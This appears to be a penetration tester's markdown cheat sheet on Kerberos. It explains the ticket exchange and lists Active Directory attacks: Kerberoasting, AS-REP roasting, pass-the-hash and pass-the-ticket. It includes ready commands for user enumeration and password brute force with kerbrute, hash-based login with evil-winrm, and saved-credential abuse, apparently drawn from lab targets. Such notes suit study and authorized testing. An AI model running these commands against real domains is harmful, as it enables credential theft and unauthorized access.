# Kerberos

## Protocol

### Acronyms

  - KDC: Key Distribution Center

### Kerberos authentication

  - AS_REQ: A user requests a **Ticket Granting Ticket** to the KDC
  - AS_REP: The KDC send the TGT
  - TGS_REQ: A user requests a **Ticket Granting Service** to the KDC with a valid **TGT**
  - TGS_REP: The KDC send the TGS
  - AP_REQ: A user requests an access to a service with a valid **TGS**
  - AP_REP: Access to service

 - ref: [MISC](https://connect.ed-diamond.com/MISC/misc-110/pre-authentification-kerberos-de-la-decouverte-a-l-exploitation-offensive), [ref2](https://beta.hackndo.com/kerberos/)

## Common attacks

### Username generation

 - [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

### KerbeRoastable


  - Crack the pass of a Service Principal Name. The TGS is encrypted with the secret of the service. If the service uses a weak password, we can find it with a bruteforce attack on the TGS.

  - [ref](https://beta.hackndo.com/kerberoasting/)

### AS-REP roasting

 - Identify users with flag DONT_REQ_PREAUTH (0x400000) on UserAccountControl [ref](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties), not so common

 - GetNPUsers.py (from impacket): This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).

    GetNPUsers.py domain/user -no-pass

 - Kerbrute

    `kerbrute_linux_amd64 userenum --dc aaa.bbb.ccc.ddd --domain DOMAIN usernames.txt`
    `kerbrute_linux_amd64 bruteuser -d fabricorp.local --dc 10.10.10.193 /usr/share/wordlists/rockyou.txt bnielson`
 
 - Pass the hash: You can connect using the hash of the user

    evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6

 - Credentials can be saved

    cmdkey /list
    cmdkey /add:<DOMAIN>\<USER> /user:<USER> /pass:<PASS>
    runas /savecred /user:<DOMAIN>\<USER> cmd

 - [ref](https://beta.hackndo.com/kerberos-asrep-roasting/)

### Pass the ticket

 - Get the TGT and use it to get a TGS and authenticate
